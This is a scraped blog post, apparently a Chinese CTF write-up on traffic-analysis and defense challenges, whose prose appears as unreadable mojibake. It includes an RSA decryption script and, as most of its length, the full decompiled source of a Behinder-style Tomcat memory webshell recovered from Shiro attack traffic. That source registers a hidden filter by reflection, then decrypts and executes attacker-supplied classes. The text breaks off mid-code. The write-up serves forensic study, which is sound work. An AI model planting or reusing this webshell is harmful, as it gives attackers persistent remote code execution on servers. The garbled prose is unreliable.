<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="é™‡å‰‘æ¯è¢«è–„çº±ä¹‹æ—…"><meta name="keywords" content="wp,reverse,æµé‡åˆ†æ,Fix,å–è¯"><meta name="author" content="Alex"><meta name="copyright" content="Alex"><title>é™‡å‰‘æ¯è¢«è–„çº±ä¹‹æ—… | Alex's blog~</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Alex's blog~" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="åˆ‡æ¢æ–‡ç« è¯¦æƒ…">åˆ‡æ¢ç«™ç‚¹æ¦‚è§ˆ</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">ç›®å½•</div><div class="sidebar-toc__progress"><span class="progress-notice">ä½ å·²ç»è¯»äº†</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%8A%E5%86%B3%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">åŠå†³èµ›</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">æ•°æ®åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#soeasy-2"><span class="toc-number">1.1.1.</span> <span class="toc-text">soeasy-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-shiro1%E3%80%813"><span class="toc-number">1.1.2.</span> <span class="toc-text">easy_shiro1ã€3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1"><span class="toc-number">1.2.</span> <span class="toc-text">å®æ™¯é˜²å¾¡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MINIGAME%E3%80%81SafeNote%E3%80%81staticFix"><span class="toc-number">1.2.1.</span> <span class="toc-text">MINIGAMEã€SafeNoteã€staticFix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ImageHost"><span class="toc-number">1.2.2.</span> <span class="toc-text">ImageHost</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guide"><span class="toc-number">1.2.3.</span> <span class="toc-text">guide</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%BA%E5%B7%A5%E6%99%BA%E9%9A%9C"><span class="toc-number">1.3.</span> <span class="toc-text">äººå·¥æ™ºéšœ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E5%86%B3%E8%B5%9B"><span class="toc-number">2.</span> <span class="toc-text">æ€»å†³èµ›</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sshell"><span class="toc-number">2.1.</span> <span class="toc-text">sshell</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://pic4.zhimg.com/80/v2-5cb1e2bdc0644f9828029a94181f4542_1440w.jpg"></div><div class="author-info__name text-center">Alex</div><div class="author-info__description text-center">pwn</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">æ–‡ç« </span><span class="pull-right">50</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">æ ‡ç­¾</span><span class="pull-right">47</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">åˆ†ç±»</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://n0vice.top/">N0vice</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://snowywar.top/">é­”æ³•å°‘å¥³é›ªæ®‡</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://l0ne1y.xyz/">L0ne1y</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://eeeeeeeeeeeeeeeea.cn/">eeeeeeeeeeeeeeeea</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://giles-one.github.io/">cat03</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://ulrica66666.github.io/">ulrica66666</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Alex's blog~</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">æ–‡ç« </a><a class="site-page" href="/tags">æ ‡ç­¾</a><a class="site-page" href="/categories">åˆ†ç±»</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">é™‡å‰‘æ¯è¢«è–„çº±ä¹‹æ—…</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-09-16</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>ğŸ‘´ğŸ»ğŸšªè¢«æ‰“å‚»äº†ï¼ŒğŸ‘´ğŸ»æ„Ÿè§‰ğŸ‘´ğŸ»æ˜¯ä¸ªfive</p>
<h1 id="åŠå†³èµ›"><a href="#åŠå†³èµ›" class="headerlink" title="åŠå†³èµ›"></a>åŠå†³èµ›</h1><p><img src="https://s2.loli.net/2023/09/16/sdq5uDwl2rFceH7.png" alt=""></p>
<h2 id="æ•°æ®åˆ†æ"><a href="#æ•°æ®åˆ†æ" class="headerlink" title="æ•°æ®åˆ†æ"></a>æ•°æ®åˆ†æ</h2><h3 id="soeasy-2"><a href="#soeasy-2" class="headerlink" title="soeasy-2"></a>soeasy-2</h3><p>æµé‡ä¸­å‘ç°ä¸€æ®µåŠ å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/16/mVJwMKAHgEXlD85.png" alt=""></p>
<p>ç„¶åä¼ äº†ä¸€æ®µç§é’¥ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/16/w92TRQmSfv36ibJ.png" alt=""></p>
<p>ä¸€æ®µå¯†æ–‡ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/16/XVgm9t16v7IUOqB.png" alt=""></p>
<p>è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_message</span>(<span class="params">message, private</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(private, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        private_key = RSA.import_key(f.read())</span><br><span class="line">    cipher = PKCS1_OAEP.new(private_key)</span><br><span class="line">    flag = cipher.decrypt(message)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">message = base64.b64decode(<span class="string">&#x27;TtmVmEmRb1pTIGlnzeckFvPsrYdn/jf4hHMgzw0uazvGFdkbZGUKSbm+husz8QX/KqRttzUJZudzPHskqp+WuIKqpN5X1/xoiikAhJQXWUvuvY+dJaYXvHe5Ir7VdEaZJB0XjgteYXVLSYACZ88TMvGeZdnbHP0VIr5ltCBl97z5XO+SYABXG7BqME7zg+GKdyj/HsaCd7+9RR9ufJiPZ90qSiZ4f3tHH2Y7LNzPdi4wClTOFJILP7w7/+06sbvt2a4A69yaDcM5vS4W2Cw2VzJe+FTMOeKl2w86FzGBjuX0MYr8UEhS4ODXVr/DePAiRvYKpJ9OVYCWhlQhMLYWYg==&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">decrypt_message(message, <span class="string">&#x27;/Users/lemon/Desktop/pwn/pwn-enclosure/3-compi/rhg/æµé‡åˆ†æ/private_key&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºå¯†æ–‡æ˜¯äºŒè¿›åˆ¶æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæŒ‰YAMLæå–ï¼Œç„¶ååœ¨messageå­—æ®µè¿›è¡Œbase64 decode</p>
<h3 id="easy-shiro1ã€3"><a href="#easy-shiro1ã€3" class="headerlink" title="easy_shiro1ã€3"></a>easy_shiro1ã€3</h3><p>æœ€åä¸Šäº†ä¸‰é“shiroé¢˜ï¼ŒğŸ‘´ğŸ»ğŸšªå› ä¸ºæ²¡æœ‰shiroå¯†é’¥çš„è§£å¯†å·¥å…·å¿˜é¢˜å…´å¹ï¼ŒğŸ‘´ğŸ»è®°å¾—shiro-550çš„å¯†é’¥æ˜¯å†™æ­»çš„ï¼Œä½†æ˜¯æ²¡æœ‰shiroæ–‡æ¡£ï¼ŒğŸ‘´ğŸ»ğŸšªåˆä¸å‡ºç½‘ï¼Œæ‰€ä»¥ä»¥ä¸ºè¿™å‡ ä¸ªshiroæ²¡æ•‘äº†ã€‚</p>
<p>ä½†æ˜¯ğŸ‘´ğŸ»çµæœºä¸€åŠ¨ï¼ŒğŸ‘´ğŸ»ä»Šå¹´hwæåˆ°äº†ä¸€å¥—æ­¦å™¨åº“ï¼ŒğŸ‘´ğŸ»ç¿»äº†ç¿»ï¼Œå‘ç°æœ‰è¿™ä¹ˆä¸ªç©æ„ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/16/dDn1HTSMwX8Ovqg.png" alt=""></p>
<p>å¥½æ´»ï¼Œå†…å­˜é©¬åç¼–è¯‘å’Œshiroè§£å¯†éƒ½æœ‰ï¼Œå½³äº</p>
<p><img src="https://s2.loli.net/2023/09/16/8ngx6rEHeDJ9CSs.png" alt=""></p>
<p>çœ‹åŸå§‹æ—¥å¿—ï¼Œå‘ç°è¿™ä¸€æ®µçš„cookieå·²ç»å¾ˆä¸æ­£å¸¸äº†ï¼Œå¹¶ä¸”çŠ¶æ€ç è¿˜æ˜¯200ï¼Œæ‹¿å»è§£ä¸‹ï¼š</p>
<p><img src="https://s2.loli.net/2023/09/16/EGhfnbIotXlspWL.png" alt=""></p>
<p>å¾—åˆ°äº†shiroå¯†é’¥ï¼Œç„¶åå‘ç°åé¢æœ‰ä¸ªuserå‚æ•°ï¼Œä¼ äº†ä¸€å †å¥‡æ€ªçš„ä¸œè¥¿</p>
<p><img src="https://s2.loli.net/2023/09/16/74tU6GNg1LqcfjZ.png" alt=""></p>
<p>çŒœæµ‹æ˜¯å†…å­˜ğŸ´ï¼Œæ‹¿å»è·‘ä¸‹</p>
<p>åç¼–è¯‘å‡ºå¦‚ä¸‹ç»“æœï¼š<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.summersec.x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.EnumSet;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.DispatcherType;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponseWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterRegistration.Dynamic;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.LifecycleState;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.util.LifecycleBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">BehinderFilter</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> HttpServletRequest request = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> HttpServletResponse response = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> String cs = <span class="string">&quot;UTF-8&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String Pwd = <span class="string">&quot;eac9fa38330a7535&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String path = <span class="string">&quot;/favicondemo.ico&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BehinderFilter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BehinderFilter</span><span class="params">(ClassLoader c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        String ret = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MessageDigest m = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = (<span class="keyword">new</span> BigInteger(<span class="number">1</span>, m.digest())).toString(<span class="number">16</span>).substring(<span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.parseObj(obj);</span><br><span class="line">        <span class="keyword">this</span>.Pwd = md5(<span class="keyword">this</span>.request.getHeader(<span class="string">&quot;p&quot;</span>));</span><br><span class="line">        <span class="keyword">this</span>.path = <span class="keyword">this</span>.request.getHeader(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">        StringBuffer output = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String tag_s = <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line">        String tag_e = <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.request.setCharacterEncoding(<span class="keyword">this</span>.cs);</span><br><span class="line">            <span class="keyword">this</span>.response.setCharacterEncoding(<span class="keyword">this</span>.cs);</span><br><span class="line">            output.append(<span class="keyword">this</span>.addFilter());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            output.append(<span class="string">&quot;ERROR:// &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.response.getWriter().print(tag_s + output.toString() + tag_e);</span><br><span class="line">            <span class="keyword">this</span>.response.getWriter().flush();</span><br><span class="line">            <span class="keyword">this</span>.response.getWriter().close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">parseObj</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (obj.getClass().isArray()) &#123;</span><br><span class="line">            Object[] data = (Object[])((Object[])((Object[])obj));</span><br><span class="line">            <span class="keyword">this</span>.request = (HttpServletRequest)data[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">this</span>.response = (HttpServletResponse)data[<span class="number">1</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class clazz = Class.forName(<span class="string">&quot;javax.servlet.jsp.PageContext&quot;</span>);</span><br><span class="line">                <span class="keyword">this</span>.request = (HttpServletRequest)clazz.getDeclaredMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(obj);</span><br><span class="line">                <span class="keyword">this</span>.response = (HttpServletResponse)clazz.getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">                <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> HttpServletRequest) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.request = (HttpServletRequest)obj;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Field req = <span class="keyword">this</span>.request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        req.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        HttpServletRequest request2 = (HttpServletRequest)req.get(<span class="keyword">this</span>.request);</span><br><span class="line">                        Field resp = request2.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">                        resp.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        <span class="keyword">this</span>.response = (HttpServletResponse)resp.get(request2);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">this</span>.response = (HttpServletResponse)<span class="keyword">this</span>.request.getClass().getDeclaredMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(obj);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">addFilter</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ServletContext servletContext = <span class="keyword">this</span>.request.getServletContext();</span><br><span class="line">        Filter filter = <span class="keyword">this</span>;</span><br><span class="line">        String filterName = <span class="keyword">this</span>.path;</span><br><span class="line">        String url = <span class="keyword">this</span>.path;</span><br><span class="line">        <span class="keyword">if</span> (servletContext.getFilterRegistration(filterName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Field contextField = <span class="keyword">null</span>;</span><br><span class="line">            ApplicationContext applicationContext = <span class="keyword">null</span>;</span><br><span class="line">            StandardContext standardContext = <span class="keyword">null</span>;</span><br><span class="line">            Field stateField = <span class="keyword">null</span>;</span><br><span class="line">            Dynamic filterRegistration = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            String var11;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                contextField = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                applicationContext = (ApplicationContext)contextField.get(servletContext);</span><br><span class="line">                contextField = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                standardContext = (StandardContext)contextField.get(applicationContext);</span><br><span class="line">                stateField = LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                stateField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                stateField.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line">                filterRegistration = servletContext.addFilter(filterName, filter);</span><br><span class="line">                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), <span class="keyword">false</span>, <span class="keyword">new</span> String[]&#123;url&#125;);</span><br><span class="line">                Method filterStartMethod = StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                filterStartMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                filterStartMethod.invoke(standardContext, (Object[])<span class="keyword">null</span>);</span><br><span class="line">                stateField.set(standardContext, LifecycleState.STARTED);</span><br><span class="line">                var11 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">                Class filterMap;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    filterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">                    filterMap = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Method findFilterMaps = standardContext.getClass().getMethod(<span class="string">&quot;findFilterMaps&quot;</span>);</span><br><span class="line">                Object[] filterMaps = (Object[])((Object[])((Object[])findFilterMaps.invoke(standardContext)));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; ++i) &#123;</span><br><span class="line">                    Object filterMapObj = filterMaps[i];</span><br><span class="line">                    findFilterMaps = filterMap.getMethod(<span class="string">&quot;getFilterName&quot;</span>);</span><br><span class="line">                    String name = (String)findFilterMaps.invoke(filterMapObj);</span><br><span class="line">                    <span class="keyword">if</span> (name.equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">                        filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">                        filterMaps[<span class="number">0</span>] = filterMapObj;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                String var25 = <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">                String var26 = var25;</span><br><span class="line">                <span class="keyword">return</span> var26;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">                var11 = var23.getMessage();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                stateField.set(standardContext, LifecycleState.STARTED);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var11;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Filter already exists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpSession session = ((HttpServletRequest)req).getSession();</span><br><span class="line">        Object lastRequest = req;</span><br><span class="line">        Object lastResponse = resp;</span><br><span class="line">        Method getResponse;</span><br><span class="line">        <span class="keyword">if</span> (!(req <span class="keyword">instanceof</span> RequestFacade)) &#123;</span><br><span class="line">            getResponse = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                getResponse = ServletRequestWrapper.class.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(lastRequest = getResponse.invoke(<span class="keyword">this</span>.request); !(lastRequest <span class="keyword">instanceof</span> RequestFacade); lastRequest = getResponse.invoke(lastRequest)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(lastResponse <span class="keyword">instanceof</span> ResponseFacade)) &#123;</span><br><span class="line">                getResponse = ServletResponseWrapper.class.getMethod(<span class="string">&quot;getResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(lastResponse = getResponse.invoke(<span class="keyword">this</span>.response); !(lastResponse <span class="keyword">instanceof</span> ResponseFacade); lastResponse = getResponse.invoke(lastResponse)) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map obj = <span class="keyword">new</span> HashMap();</span><br><span class="line">        obj.put(<span class="string">&quot;request&quot;</span>, lastRequest);</span><br><span class="line">        obj.put(<span class="string">&quot;response&quot;</span>, lastResponse);</span><br><span class="line">        obj.put(<span class="string">&quot;session&quot;</span>, session);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            session.putValue(<span class="string">&quot;u&quot;</span>, <span class="keyword">this</span>.Pwd);</span><br><span class="line">            Cipher c = Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">            c.init(<span class="number">2</span>, <span class="keyword">new</span> SecretKeySpec(<span class="keyword">this</span>.Pwd.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">            (<span class="keyword">new</span> BehinderFilter(<span class="keyword">this</span>.getClass().getClassLoader())).g(c.doFinal(<span class="keyword">this</span>.base64Decode(req.getReader().readLine()))).newInstance().equals(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            var9.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])((<span class="keyword">byte</span>[])clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            Object decoder = clazz.getMethod(<span 